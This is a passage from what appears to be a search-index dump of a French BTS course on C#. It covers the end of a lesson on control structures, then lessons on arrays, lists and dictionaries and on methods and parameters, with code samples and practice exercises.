\u00c9vitez les boucles infinies :** <pre><code>// \u274c Mauvais\nwhile (true)\n{\n    // Code sans condition de sortie\n}\n\n// \u2705 Bon\nbool continuer = true;\nwhile (continuer)\n{\n    // Code avec condition de sortie\n    if (conditionSortie)\n        continuer = false;\n}\n</code></pre>  **2. Utilisez foreach quand c'est possible :** <pre><code>int[] tableau = {1, 2, 3, 4, 5};\n\n// \u274c Moins lisible\nfor (int i = 0; i &lt; tableau.Length; i++)\n{\n    Console.WriteLine(tableau[i]);\n}\n\n// \u2705 Plus lisible\nforeach (int element in tableau)\n{\n    Console.WriteLine(element);\n}\n</code></pre>  **3. \u00c9vitez les conditions complexes :** <pre><code>// \u274c Difficile \u00e0 lire\nif (age &gt;= 18 &amp;&amp; age &lt;= 65 &amp;&amp; salaire &gt; 30000 &amp;&amp; !estEtudiant)\n{\n    // Code\n}\n\n// \u2705 Plus clair\nbool estAdulteActif = age &gt;= 18 &amp;&amp; age &lt;= 65;\nbool aSalaireCorrect = salaire &gt; 30000;\nbool peutEmprunter = estAdulteActif &amp;&amp; aSalaireCorrect &amp;&amp; !estEtudiant;\n\nif (peutEmprunter)\n{\n    // Code\n}\n</code></pre> \ud83d\udcda Points cl\u00e9s \u00e0 retenir \ud83c\udfaf R\u00e9sum\u00e9 du chapitre : <ul> <li>Conditions : if/else, switch, op\u00e9rateur ternaire</li> <li>Boucles : for (compteur), while (condition), foreach (collection)</li> <li>Contr\u00f4le : break (sortir), continue (passer)</li> <li>Imbrication : Possible mais attention \u00e0 la lisibilit\u00e9</li> <li>Bonnes pratiques : Code lisible, \u00e9viter les boucles infinies</li> </ul>"},{"location":"BTS/B2/B2_2_Structures_controle/#liens-utiles","title":"\ud83d\udd17 Liens utiles","text":"<ul> <li>Structures conditionnelles C#</li> <li>Boucles en C#</li> <li>Switch expressions C# 8.0</li> </ul> <p>\u00c9tape pr\u00e9c\u00e9dente : B2.1 - Les bases du C# Prochaine \u00e9tape : B2.3 - Listes et collections</p>"},{"location":"BTS/B2/B2_3_Listes_collections/","title":"\ud83d\udccb B2.3 - Listes et Collections en C","text":""},{"location":"BTS/B2/B2_3_Listes_collections/#objectifs-du-cours","title":"\ud83d\udccb Objectifs du cours","text":"<p>\u00c0 la fin de ce cours, vous serez capable de : - \u2705 Comprendre la diff\u00e9rence entre tableaux et listes - \u2705 Manipuler les tableaux (arrays) en C# - \u2705 Utiliser les listes (List) et leurs m\u00e9thodes - \u2705 Travailler avec les dictionnaires (Dictionary) - \u2705 Choisir la bonne collection selon le contexte \ud83d\udcca Introduction aux collections \ud83d\udce6 Qu'est-ce qu'une collection ?  Une collection est une structure de donn\u00e9es qui permet de stocker et organiser plusieurs \u00e9l\u00e9ments du m\u00eame type ou de types diff\u00e9rents. En C#, nous avons plusieurs types de collections adapt\u00e9es \u00e0 diff\u00e9rents besoins.  \ud83d\udd0d Comparaison des principales collections  | Collection | Taille | Acc\u00e8s | Utilisation | |------------|--------|-------|-------------| | **Array** | Fixe | Index | Donn\u00e9es de taille connue | | **List** | Variable | Index | Donn\u00e9es dynamiques | | **Dictionary** | Variable | Cl\u00e9 | Associations cl\u00e9-valeur |   \ud83d\uddc2\ufe0f Les tableaux (Arrays) \ud83d\udcdd D\u00e9claration et initialisation <pre><code>// D\u00e9claration avec taille fixe\nint[] nombres = new int[5]; // Tableau de 5 entiers (0 par d\u00e9faut)\n\n// D\u00e9claration avec initialisation\nint[] scores = { 85, 92, 78, 96, 88 };\n\n// Autre syntaxe d'initialisation\nstring[] noms = new string[] { \"Alice\", \"Bob\", \"Charlie\" };\n\n// Initialisation avec new (C# 3.0+)\nvar couleurs = new[] { \"Rouge\", \"Vert\", \"Bleu\" };\n</code></pre> \ud83c\udfaf Acc\u00e8s et modification <pre><code>int[] notes = { 15, 18, 12, 16, 14 };\n\n// Acc\u00e8s en lecture\nConsole.WriteLine($\"Premi\u00e8re note : {notes[0]}\"); // 15\nConsole.WriteLine($\"Derni\u00e8re note : {notes[notes.Length - 1]}\"); // 14\n\n// Modification\nnotes[2] = 20; // Change 12 en 20\n\n// Parcours avec for\nfor (int i = 0; i &lt; notes.Length; i++)\n{\n    Console.WriteLine($\"Note {i + 1} : {notes[i]}\");\n}\n\n// Parcours avec foreach\nforeach (int note in notes)\n{\n    Console.WriteLine($\"Note : {note}\");\n}\n</code></pre> \ud83d\udd27 M\u00e9thodes utiles pour les tableaux <pre><code>int[] nombres = { 5, 2, 8, 1, 9, 3 };\n\n// Taille du tableau\nConsole.WriteLine($\"Taille : {nombres.Length}\");\n\n// Tri\nArray.Sort(nombres);\nConsole.WriteLine(\"Tri\u00e9 : \" + string.Join(\", \", nombres)); // 1, 2, 3, 5, 8, 9\n\n// Recherche\nint index = Array.IndexOf(nombres, 5);\nConsole.WriteLine($\"Index de 5 : {index}\"); // 3\n\n// Inversion\nArray.Reverse(nombres);\nConsole.WriteLine(\"Invers\u00e9 : \" + string.Join(\", \", nombres)); // 9, 8, 5, 3, 2, 1\n\n// Copie\nint[] copie = new int[nombres.Length];\nArray.Copy(nombres, copie, nombres.Length);\n</code></pre> \ud83d\udccb Les listes (List) \ud83d\udcc8 Avantages des listes  Les listes sont des collections dynamiques qui peuvent grandir ou r\u00e9tr\u00e9cir pendant l'ex\u00e9cution. Elles offrent plus de flexibilit\u00e9 que les tableaux et de nombreuses m\u00e9thodes utiles.  \ud83d\ude80 Cr\u00e9ation et initialisation <pre><code>// Import n\u00e9cessaire\nusing System.Collections.Generic;\n\n// Liste vide\nList&lt;int&gt; nombres = new List&lt;int&gt;();\n\n// Liste avec capacit\u00e9 initiale\nList&lt;string&gt; noms = new List&lt;string&gt;(10);\n\n// Liste avec initialisation\nList&lt;double&gt; prix = new List&lt;double&gt; { 19.99, 25.50, 12.75 };\n\n// Syntaxe moderne (C# 9.0+)\nList&lt;string&gt; couleurs = new() { \"Rouge\", \"Vert\", \"Bleu\" };\n</code></pre> \u2795 Ajout d'\u00e9l\u00e9ments <pre><code>List&lt;string&gt; fruits = new List&lt;string&gt;();\n\n// Ajouter un \u00e9l\u00e9ment \u00e0 la fin\nfruits.Add(\"Pomme\");\nfruits.Add(\"Banane\");\n\n// Ajouter plusieurs \u00e9l\u00e9ments\nfruits.AddRange(new[] { \"Orange\", \"Kiwi\", \"Mangue\" });\n\n// Ins\u00e9rer \u00e0 une position sp\u00e9cifique\nfruits.Insert(1, \"Poire\"); // Ins\u00e8re \"Poire\" \u00e0 l'index 1\n\n// R\u00e9sultat : [\"Pomme\", \"Poire\", \"Banane\", \"Orange\", \"Kiwi\", \"Mangue\"]\nConsole.WriteLine(string.Join(\", \", fruits));\n</code></pre> \ud83d\uddd1\ufe0f Suppression d'\u00e9l\u00e9ments <pre><code>List&lt;int&gt; nombres = new List&lt;int&gt; { 1, 2, 3, 4, 5, 3, 6 };\n\n// Supprimer la premi\u00e8re occurrence\nnombres.Remove(3); // Supprime le premier 3\n// R\u00e9sultat : [1, 2, 4, 5, 3, 6]\n\n// Supprimer \u00e0 un index sp\u00e9cifique\nnombres.RemoveAt(0); // Supprime l'\u00e9l\u00e9ment \u00e0 l'index 0\n// R\u00e9sultat : [2, 4, 5, 3, 6]\n\n// Supprimer une plage\nnombres.RemoveRange(1, 2); // Supprime 2 \u00e9l\u00e9ments \u00e0 partir de l'index 1\n// R\u00e9sultat : [2, 3, 6]\n\n// Supprimer tous les \u00e9l\u00e9ments qui correspondent \u00e0 une condition\nnombres.RemoveAll(x =&gt; x &gt; 3); // Supprime tous les nombres &gt; 3\n// R\u00e9sultat : [2, 3]\n\n// Vider la liste\nnombres.Clear();\n</code></pre> \ud83d\udd0d Recherche et v\u00e9rification <pre><code>List&lt;string&gt; animaux = new List&lt;string&gt; { \"Chat\", \"Chien\", \"Oiseau\", \"Poisson\" };\n\n// V\u00e9rifier si un \u00e9l\u00e9ment existe\nbool aChat = animaux.Contains(\"Chat\"); // true\n\n// Trouver l'index d'un \u00e9l\u00e9ment\nint index = animaux.IndexOf(\"Chien\"); // 1\n\n// Trouver le dernier index\nanimaux.Add(\"Chat\"); // Ajoute un deuxi\u00e8me \"Chat\"\nint dernierIndex = animaux.LastIndexOf(\"Chat\"); // 4\n\n// Compter les \u00e9l\u00e9ments\nint total = animaux.Count; // 5\n\n// V\u00e9rifier si la liste est vide\nbool estVide = animaux.Count == 0; // false\n\n// Recherche avec condition (LINQ)\nusing System.Linq;\nstring premierOiseau = animaux.FirstOrDefault(a =&gt; a.StartsWith(\"O\")); // \"Oiseau\"\n</code></pre> \ud83d\udd04 Tri et manipulation <pre><code>List&lt;int&gt; scores = new List&lt;int&gt; { 85, 92, 78, 96, 88 };\n\n// Tri croissant\nscores.Sort();\nConsole.WriteLine(string.Join(\", \", scores)); // 78, 85, 88, 92, 96\n\n// Tri d\u00e9croissant\nscores.Sort((a, b) =&gt; b.CompareTo(a));\nConsole.WriteLine(string.Join(\", \", scores)); // 96, 92, 88, 85, 78\n\n// Inversion\nscores.Reverse();\n\n// Conversion en tableau\nint[] tableau = scores.ToArray();\n\n// Copie vers une autre liste\nList&lt;int&gt; copie = new List&lt;int&gt;(scores);\n</code></pre> \ud83d\udddd\ufe0f Les dictionnaires (Dictionary) \ud83d\udd11 Principe des dictionnaires  Un dictionnaire stocke des paires cl\u00e9-valeur. Chaque cl\u00e9 est unique et permet d'acc\u00e9der rapidement \u00e0 sa valeur associ\u00e9e. C'est id\u00e9al pour cr\u00e9er des associations ou des index.  \ud83c\udfd7\ufe0f Cr\u00e9ation et initialisation <pre><code>// Import n\u00e9cessaire\nusing System.Collections.Generic;\n\n// Dictionnaire vide\nDictionary&lt;string, int&gt; ages = new Dictionary&lt;string, int&gt;();\n\n// Dictionnaire avec initialisation\nDictionary&lt;string, string&gt; capitales = new Dictionary&lt;string, string&gt;\n{\n    { \"France\", \"Paris\" },\n    { \"Espagne\", \"Madrid\" },\n    { \"Italie\", \"Rome\" }\n};\n\n// Syntaxe moderne (C# 6.0+)\nvar notes = new Dictionary&lt;string, double&gt;\n{\n    [\"Alice\"] = 15.5,\n    [\"Bob\"] = 18.0,\n    [\"Charlie\"] = 12.5\n};\n</code></pre> \u2795 Ajout et modification <pre><code>Dictionary&lt;string, int&gt; stock = new Dictionary&lt;string, int&gt;();\n\n// Ajouter des \u00e9l\u00e9ments\nstock.Add(\"Pommes\", 50);\nstock.Add(\"Bananes\", 30);\n\n// Syntaxe avec indexeur (plus simple)\nstock[\"Oranges\"] = 25;\nstock[\"Kiwis\"] = 15;\n\n// Modifier une valeur existante\nstock[\"Pommes\"] = 45; // Change 50 en 45\n\n// Ajouter seulement si la cl\u00e9 n'existe pas\nif (!stock.ContainsKey(\"Mangues\"))\n{\n    stock[\"Mangues\"] = 20;\n}\n\n// M\u00e9thode TryAdd (C# 7.0+)\nstock.TryAdd(\"Ananas\", 10); // Ajoute seulement si la cl\u00e9 n'existe pas\n</code></pre> \ud83d\udd0d Acc\u00e8s et recherche <pre><code>Dictionary&lt;string, double&gt; prix = new Dictionary&lt;string, double&gt;\n{\n    [\"Pain\"] = 1.20,\n    [\"Lait\"] = 0.95,\n    [\"\u0152ufs\"] = 2.50\n};\n\n// Acc\u00e8s direct (attention aux exceptions !)\ndouble prixPain = prix[\"Pain\"]; // 1.20\n\n// Acc\u00e8s s\u00e9curis\u00e9 avec TryGetValue\nif (prix.TryGetValue(\"Beurre\", out double prixBeurre))\n{\n    Console.WriteLine($\"Prix du beurre : {prixBeurre}\u20ac\");\n}\nelse\n{\n    Console.WriteLine(\"Beurre non trouv\u00e9\");\n}\n\n// V\u00e9rifier l'existence d'une cl\u00e9\nbool aPain = prix.ContainsKey(\"Pain\"); // true\n\n// V\u00e9rifier l'existence d'une valeur\nbool aArticleA2Euros = prix.ContainsValue(2.00); // false\n\n// Nombre d'\u00e9l\u00e9ments\nint nombreArticles = prix.Count; // 3\n</code></pre> \ud83d\udd04 Parcours des dictionnaires <pre><code>Dictionary&lt;string, int&gt; scores = new Dictionary&lt;string, int&gt;\n{\n    [\"Alice\"] = 95,\n    [\"Bob\"] = 87,\n    [\"Charlie\"] = 92\n};\n\n// Parcours des paires cl\u00e9-valeur\nforeach (KeyValuePair&lt;string, int&gt; kvp in scores)\n{\n    Console.WriteLine($\"{kvp.Key} : {kvp.Value} points\");\n}\n\n// Syntaxe simplifi\u00e9e (C# 7.0+)\nforeach (var (nom, score) in scores)\n{\n    Console.WriteLine($\"{nom} : {score} points\");\n}\n\n// Parcours des cl\u00e9s seulement\nforeach (string nom in scores.Keys)\n{\n    Console.WriteLine($\"Joueur : {nom}\");\n}\n\n// Parcours des valeurs seulement\nforeach (int score in scores.Values)\n{\n    Console.WriteLine($\"Score : {score}\");\n}\n</code></pre> \ud83c\udfaf Exercices pratiques \ud83c\udfcb\ufe0f Exercice 1 : Gestionnaire de notes  Cr\u00e9ez un programme qui : 1. Stocke les notes d'\u00e9tudiants dans un dictionnaire 2. Permet d'ajouter, modifier et supprimer des notes 3. Calcule et affiche la moyenne de la classe 4. Trouve l'\u00e9tudiant avec la meilleure note  <pre><code>// Votre code ici\n</code></pre> \ud83c\udfcb\ufe0f Exercice 2 : Inventaire de magasin  Cr\u00e9ez un syst\u00e8me d'inventaire qui : 1. Utilise un dictionnaire pour stocker les produits et leurs quantit\u00e9s 2. Permet d'ajouter/retirer du stock 3. Affiche les produits en rupture de stock (quantit\u00e9 = 0) 4. Calcule la valeur totale du stock (avec un dictionnaire des prix)  <pre><code>// Votre code ici\n</code></pre> \ud83c\udfcb\ufe0f Exercice 3 : Analyseur de texte  Cr\u00e9ez un programme qui : 1. Lit un texte saisi par l'utilisateur 2. Compte le nombre d'occurrences de chaque mot 3. Affiche les mots par ordre de fr\u00e9quence 4. Ignore la casse et la ponctuation  <pre><code>// Indice : utilisez string.Split() et char.IsPunctuation()\n</code></pre> \ud83c\udfcb\ufe0f Exercice 4 : Carnet d'adresses  Cr\u00e9ez un carnet d'adresses qui : 1. Stocke nom, t\u00e9l\u00e9phone et email dans une classe Contact 2. Utilise une List pour stocker tous les contacts 3. Permet de rechercher par nom 4. Trie les contacts par ordre alphab\u00e9tique  <pre><code>public class Contact\n{\n    public string Nom { get; set; }\n    public string Telephone { get; set; }\n    public string Email { get; set; }\n}\n</code></pre> \u26a1 Performances et bonnes pratiques \ud83d\ude80 Conseils d'optimisation   **1. Choisir la bonne collection :** <pre><code>// \u2705 Pour des donn\u00e9es de taille fixe\nint[] scores = new int[10];\n\n// \u2705 Pour des donn\u00e9es dynamiques avec acc\u00e8s par index\nList&lt;string&gt; noms = new List&lt;string&gt;();\n\n// \u2705 Pour des associations cl\u00e9-valeur\nDictionary&lt;string, int&gt; ages = new Dictionary&lt;string, int&gt;();\n</code></pre>  **2. Initialiser avec la bonne capacit\u00e9 :** <pre><code>// \u2705 Si vous connaissez la taille approximative\nList&lt;int&gt; nombres = new List&lt;int&gt;(1000); // \u00c9vite les redimensionnements\n</code></pre>  **3. Utiliser les bonnes m\u00e9thodes :** <pre><code>// \u274c Lent pour de grandes collections\nfor (int i = 0; i &lt; liste.Count; i++)\n{\n    if (liste[i] == valeur) return i;\n}\n\n// \u2705 Plus rapide\nint index = liste.IndexOf(valeur);\n</code></pre>  **4. Attention aux modifications pendant l'it\u00e9ration :** <pre><code>// \u274c Erreur \u00e0 l'ex\u00e9cution\nforeach (var item in liste)\n{\n    if (condition)\n        liste.Remove(item); // Exception !\n}\n\n// \u2705 Solution\nfor (int i = liste.Count - 1; i &gt;= 0; i--)\n{\n    if (condition)\n        liste.RemoveAt(i);\n}\n</code></pre> \ud83d\udcda Points cl\u00e9s \u00e0 retenir \ud83c\udfaf R\u00e9sum\u00e9 du chapitre : <ul> <li>Tableaux : Taille fixe, acc\u00e8s rapide par index</li> <li>Listes : Taille variable, nombreuses m\u00e9thodes utiles</li> <li>Dictionnaires : Associations cl\u00e9-valeur, acc\u00e8s rapide par cl\u00e9</li> <li>Choix : D\u00e9pend du type de donn\u00e9es et des op\u00e9rations n\u00e9cessaires</li> <li>Performance : Initialiser avec la bonne capacit\u00e9, choisir les bonnes m\u00e9thodes</li> </ul>"},{"location":"BTS/B2/B2_3_Listes_collections/#liens-utiles","title":"\ud83d\udd17 Liens utiles","text":"<ul> <li>Collections en C#</li> <li>List Class <li>Dictionary Class <p>\u00c9tape pr\u00e9c\u00e9dente : B2.2 - Structures de contr\u00f4le Prochaine \u00e9tape : B2.4 - Fonctions et m\u00e9thodes</p>"},{"location":"BTS/B2/B2_4_Fonctions_methodes/","title":"\ud83d\udd27 B2.4 - Fonctions et M\u00e9thodes en C","text":""},{"location":"BTS/B2/B2_4_Fonctions_methodes/#objectifs-du-cours","title":"\ud83d\udccb Objectifs du cours","text":"<p>\u00c0 la fin de ce cours, vous serez capable de : - \u2705 Comprendre l'utilit\u00e9 des fonctions et m\u00e9thodes - \u2705 Cr\u00e9er des m\u00e9thodes avec et sans param\u00e8tres - \u2705 Utiliser les valeurs de retour - \u2705 Ma\u00eetriser les diff\u00e9rents types de param\u00e8tres - \u2705 Appliquer les bonnes pratiques de programmation modulaire</p> \ud83c\udfaf Introduction aux m\u00e9thodes \ud83d\udd27 Qu'est-ce qu'une m\u00e9thode ?  Une m\u00e9thode est un bloc de code r\u00e9utilisable qui effectue une t\u00e2che sp\u00e9cifique. Elle permet de diviser un programme complexe en parties plus petites et plus g\u00e9rables, favorisant la r\u00e9utilisabilit\u00e9 et la lisibilit\u00e9 du code.  \ud83d\udca1 Avantages des m\u00e9thodes : <ul> <li>R\u00e9utilisabilit\u00e9 : \u00c9vite la duplication de code</li> <li>Lisibilit\u00e9 : Code plus organis\u00e9 et compr\u00e9hensible</li> <li>Maintenance : Modifications centralis\u00e9es</li> <li>Test : Facilite les tests unitaires</li> </ul> \ud83d\udcdd Anatomie d'une m\u00e9thode <pre><code>// Syntaxe g\u00e9n\u00e9rale\n[modificateur] [type_retour] NomMethode([param\u00e8tres])\n{\n    // Corps de la m\u00e9thode\n    [return valeur;] // Si type_retour != void\n}\n\n// Exemple concret\npublic static int Additionner(int a, int b)\n{\n    int resultat = a + b;\n    return resultat;\n}\n</code></pre> \ud83d\ude80 M\u00e9thodes simples \ud83d\udd24 M\u00e9thodes sans param\u00e8tres ni retour <pre><code>// M\u00e9thode qui affiche un message\npublic static void AfficherBienvenue()\n{\n    Console.WriteLine(\"===================\");\n    Console.WriteLine(\"  BIENVENUE !  \");\n    Console.WriteLine(\"===================\");\n}\n\n// M\u00e9thode qui affiche la date actuelle\npublic static void AfficherDate()\n{\n    DateTime maintenant = DateTime.Now;\n    Console.WriteLine($\"Nous sommes le {maintenant:dd/MM/yyyy}\");\n}\n\n// Utilisation dans Main\nstatic void Main(string[] args)\n{\n    AfficherBienvenue();\n    AfficherDate();\n}\n</code></pre> \ud83d\udce4 M\u00e9thodes avec valeur de retour <pre><code>// M\u00e9thode qui retourne un nombre al\u00e9atoire\npublic static int GenererNombreAleatoire()\n{\n    Random random = new Random();\n    return random.Next(1, 101); // Entre 1 et 100\n}\n\n// M\u00e9thode qui retourne l'heure actuelle format\u00e9e\npublic static string ObtenirHeureActuelle()\n{\n    return DateTime.Now.ToString(\"HH:mm:ss\");\n}\n\n// M\u00e9thode qui v\u00e9rifie si une ann\u00e9e est bissextile\npublic static bool EstBissextile(int annee)\n{\n    return (annee % 4 == 0 &amp;&amp; annee % 100 != 0) || (annee % 400 == 0);\n}\n\n// Utilisation\nstatic void Main(string[] args)\n{\n    int nombre = GenererNombreAleatoire();\n    string heure = ObtenirHeureActuelle();\n    bool bissextile = EstBissextile(2024);\n\n    Console.WriteLine($\"Nombre : {nombre}\");\n    Console.WriteLine($\"Heure : {heure}\");\n    Console.WriteLine($\"2024 est bissextile : {bissextile}\");\n}\n</code></pre> \ud83d\udce5 Param\u00e8tres de m\u00e9thodes \ud83c\udfaf Param\u00e8tres simples <pre><code>// M\u00e9thode avec un param\u00e8tre\npublic static void SaluerPersonne(string nom)\n{\n    Console.WriteLine($\"Bonjour {nom} !\");\n}\n\n// M\u00e9thode avec plusieurs param\u00e8tres\npublic static double CalculerAire(double longueur, double largeur)\n{\n    return longueur * largeur;\n}\n\n// M\u00e9thode avec param\u00e8tres de types diff\u00e9rents\npublic static void AfficherInfoPersonne(string nom, int age, bool estEtudiant)\n{\n    Console.WriteLine($\"Nom : {nom}\");\n    Console.WriteLine($\"\u00c2ge : {age} ans\");\n    Console.WriteLine($\"Statut : {(estEtudiant ? \"\u00c9tudiant\" : \"Non \u00e9tudiant\")}\");\n}\n\n// Utilisation\nstatic void Main(string[] args)\n{\n    SaluerPersonne(\"Alice\");\n\n    double aire = CalculerAire(5.5, 3.2);\n    Console.WriteLine($\"Aire : {aire} m\u00b2\");\n\n    AfficherInfoPersonne(\"Bob\", 22, true);\n}\n</code></pre> \ud83d\udd27 Param\u00e8tres avec valeurs par d\u00e9faut <pre><code>// Param\u00e8tres optionnels avec valeurs par d\u00e9faut\npublic static void CreerCompte(string nom, string email, bool estActif = true, string role = \"Utilisateur\")\n{\n    Console.WriteLine($\"Compte cr\u00e9\u00e9 :\");\n    Console.WriteLine($\"- Nom : {nom}\");\n    Console.WriteLine($\"- Email : {email}\");\n    Console.WriteLine($\"- Actif : {estActif}\");\n    Console.WriteLine($\"- R\u00f4le : {role}\");\n}\n\n// M\u00e9thode de calcul avec param\u00e8tres optionnels\npublic static double CalculerPrix(double prixBase, double tva = 0.20, double remise = 0.0)\n{\n    double prixAvecTva = prixBase * (1 + tva);\n    double prixFinal = prixAvecTva * (1 - remise);\n    return prixFinal;\n}\n\n// Utilisation avec diff\u00e9rentes combinaisons\nstatic void Main(string[] args)\n{\n    // Tous les param\u00e8tres\n    CreerCompte(\"Alice\", \"alice@email.com\", true, \"Admin\");\n\n    // Param\u00e8tres par d\u00e9faut utilis\u00e9s\n    CreerCompte(\"Bob\", \"bob@email.com\");\n\n    // Param\u00e8tres nomm\u00e9s\n    CreerCompte(\"Charlie\", \"charlie@email.com\", role: \"Mod\u00e9rateur\");\n\n    // Calculs de prix\n    double prix1 = CalculerPrix(100);           // 120\u20ac (TVA 20%)\n    double prix2 = CalculerPrix(100, 0.10);     // 110\u20ac (TVA 10%)\n    double prix3 = CalculerPrix(100, 0.20, 0.15); // 102\u20ac (TVA 20%, remise 15%)\n}\n</code></pre> \ud83d\udccb Param\u00e8tres params <pre><code>// M\u00e9thode avec nombre variable de param\u00e8tres\npublic static int Additionner(params int[] nombres)\n{\n    int somme = 0;\n    foreach (int nombre in nombres)\n    {\n        somme += nombre;\n    }\n    return somme;\n}\n\n// M\u00e9thode pour formater un message avec plusieurs valeurs\npublic static string FormaterMessage(string template, params object[] valeurs)\n{\n    return string.Format(template, valeurs);\n}\n\n// Utilisation\nstatic void Main(string[] args)\n{\n    // Diff\u00e9rentes fa\u00e7ons d'appeler la m\u00e9thode\n    int somme1 = Additionner(1, 2, 3);           // 6\n    int somme2 = Additionner(10, 20, 30, 40);    // 100\n    int somme3 = Additionner();                  // 0\n\n    // Avec un tableau\n    int[] nombres = { 5, 10, 15 };\n    int somme4 = Additionner(nombres);           // 30\n\n    // Formatage de messages\n    string msg = FormaterMessage(\"Bonjour {0}, vous avez {1} ans\", \"Alice\", 25);\n    Console.WriteLine(msg); // \"Bonjour Alice, vous avez 25 ans\"\n}\n</code></pre> \ud83d\udd04 Param\u00e8tres par r\u00e9f\u00e9rence \ud83d\udce4 Param\u00e8tres out <pre><code>// M\u00e9thode qui retourne plusieurs valeurs avec out\npublic static bool DiviserAvecReste(int dividende, int diviseur, out int quotient, out int reste)\n{\n    if (diviseur == 0)\n    {\n        quotient = 0;\n        reste = 0;\n        return false; // Division impossible\n    }\n\n    quotient = dividende / diviseur;\n    reste = dividende % diviseur;\n    return true; // Division r\u00e9ussie\n}\n\n// M\u00e9thode pour analyser une cha\u00eene de nombres\npublic static bool AnalyserNombres(string texte, out int minimum, out int maximum, out double moyenne)\n{\n    minimum = 0;\n    maximum = 0;\n    moyenne = 0;\n\n    string[] parties = texte.Split(',');\n    List&lt;int&gt; nombres = new List&lt;int&gt;();\n\n    foreach (string partie in parties)\n    {\n        if (int.TryParse(partie.Trim(), out int nombre))\n        {\n            nombres.Add(nombre);\n        }\n    }\n\n    if (nombres.Count == 0)\n        return false;\n\n    minimum = nombres.Min();\n    maximum = nombres.Max();\n    moyenne = nombres.Average();\n    return true;\n}\n\n// Utilisation\nstatic void Main(string[] args)\n{\n    // Division avec reste\n    if (DiviserAvecReste(17, 5, out int quotient, out int reste))\n    {\n        Console.WriteLine($\"17 \u00f7 5 = {quotient} reste {reste}\");\n    }\n\n    // Analyse de nombres\n    string donnees = \"10, 25, 8, 33, 12\";\n    if (AnalyserNombres(donnees, out int min, out int max, out double moy))\n    {\n        Console.WriteLine($\"Min: {min}, Max: {max}, Moyenne: {moy:F2}\");\n    }\n}\n</code></pre> \ud83d\udd04 Param\u00e8tres ref <pre><code>// M\u00e9thode qui \u00e9change deux valeurs\npublic static void Echanger(ref int a, ref int b)\n{\n    int temp = a;\n    a = b;\n    b = temp;\n}\n\n// M\u00e9thode qui modifie une cha\u00eene\npublic static void TransformerTexte(ref string texte)\n{\n    texte = texte.ToUpper().Replace(\" \", \"_\");\n}\n\n// M\u00e9thode qui applique une remise\npublic static void AppliquerRemise(ref double prix, double pourcentageRemise)\n{\n    prix = prix * (1 - pourcentageRemise / 100);\n}\n\n// Utilisation\nstatic void Main(string[] args)\n{\n    // \u00c9change de valeurs\n    int x = 10, y = 20;\n    Console.WriteLine($\"Avant : x={x}, y={y}\");\n    Echanger(ref x, ref y);\n    Console.WriteLine($\"Apr\u00e8s : x={x}, y={y}\");\n\n    // Transformation de texte\n    string message = \"Bonjour le monde\";\n    Console.WriteLine($\"Avant : {message}\");\n    TransformerTexte(ref message);\n    Console.WriteLine($\"Apr\u00e8s : {message}\");\n\n    // Application de remise\n    double prix = 100.0;\n    Console.WriteLine($\"Prix initial : {prix}\u20ac\");\n    AppliquerRemise(ref prix, 15); // 15% de remise\n    Console.WriteLine($\"Prix apr\u00e8s remise : {prix}\u20ac\");\n}\n</code></pre> \ud83c\udfd7\ufe0f M\u00e9thodes avanc\u00e9es \ud83d\udd04 Surcharge de m\u00e9thodes (Overloading) <pre><code>// Plusieurs versions de la m\u00eame m\u00e9thode avec des param\u00e8tres diff\u00e9rents\npublic static class Calculatrice\n{\n    // Addition de deux entiers\n    public static int Additionner(int a, int b)\n    {\n        return a + b;\n    }\n\n    // Addition de trois entiers\n    public static int Additionner(int a, int b, int c)\n    {\n        return a + b + c;\n    }\n\n    // Addition de deux doubles\n    public static double Additionner(double a, double b)\n    {\n        return a + b;\n    }\n\n    // Addition d'un tableau d'entiers\n    public static int Additionner(int[] nombres)\n    {\n        int somme = 0;\n        foreach (int nombre in nombres)\n        {\n            somme += nombre;\n        }\n        return somme;\n    }\n}\n\n// Utilisation\nstatic void Main(string[] args)\n{\n    int somme1 = Calculatrice.Additionner(5, 3);           // 8\n    int somme2 = Calculatrice.Additionner(1, 2, 3);        // 6\n    double somme3 = Calculatrice.Additionner(2.5, 3.7);    // 6.2\n    int somme4 = Calculatrice.Additionner(new int[] { 1, 2, 3, 4 }); // 10\n}\n</code></pre> \ud83c\udfaf M\u00e9thodes d'extension <pre><code>// Classe statique pour les m\u00e9thodes d'extension\npublic static class StringExtensions\n{\n    // M\u00e9thode d'extension pour compter les mots\n    public static int CompterMots(this string texte)\n    {\n        if (string.IsNullOrWhiteSpace(texte))\n            return 0;\n\n        return texte.Split(new char[] { ' ', '\\t', '\\n' }, \n                          StringSplitOptions.RemoveEmptyEntries).Length;\n    }\n\n    // M\u00e9thode d'extension pour inverser une cha\u00eene\n    public static string Inverser(this string texte)\n    {\n        if (string.IsNullOrEmpty(texte))\n            return texte;\n\n        char[] caracteres = texte.ToCharArray();\n        Array.Reverse(caracteres);\n        return new string(caracteres);\n    }\n\n    // M\u00e9thode d'extension pour capitaliser chaque mot\n    public static string CapitaliserMots(this string texte)\n    {\n        if (string.IsNullOrWhiteSpace(texte))\n            return texte;\n\n        return System.Globalization.CultureInfo.CurrentCulture.TextInfo.ToTitleCase(texte.ToLower());\n    }\n}\n\n// Utilisation\nstatic void Main(string[] args)\n{\n    string phrase = \"bonjour le monde\";\n\n    // Utilisation comme si c'\u00e9taient des m\u00e9thodes de la classe string\n    int nombreMots = phrase.CompterMots();           // 3\n    string inverse = phrase.Inverser();              // \"ednom el ruojnob\"\n    string capitalise = phrase.CapitaliserMots();    // \"Bonjour Le Monde\"\n\n    Console.WriteLine($\"Phrase : {phrase}\");\n    Console.WriteLine($\"Nombre de mots : {nombreMots}\");\n    Console.WriteLine($\"Invers\u00e9e : {inverse}\");\n    Console.WriteLine($\"Capitalis\u00e9e : {capitalise}\");\n}\n</code></pre> \ud83c\udfaf Exercices pratiques \ud83c\udfcb\ufe0f Exercice 1 : Calculatrice avanc\u00e9e  Cr\u00e9ez une classe Calculatrice avec les m\u00e9thodes suivantes : 1. `Additionner`, `Soustraire`, `Multiplier`, `Diviser` (avec gestion division par z\u00e9ro) 2. `Puissance` (nombre \u00e9lev\u00e9 \u00e0 une puissance) 3. `Factorielle` (calcul r\u00e9cursif ou it\u00e9ratif) 4. `EstPremier` (v\u00e9rifier si un nombre est premier)  <pre><code>public static class Calculatrice\n{\n    // Vos m\u00e9thodes ici\n}\n</code></pre> \ud83c\udfcb\ufe0f Exercice 2 : Gestionnaire de mots de passe  Cr\u00e9ez des m\u00e9thodes pour : 1. `GenererMotDePasse(int longueur, bool inclureSymboles = false)` 2. `ValiderMotDePasse(string motDePasse, out string[] erreurs)` 3. `CalculerForce(string motDePasse)` qui retourne un score de 0 \u00e0 100  Crit\u00e8res de validation : au moins 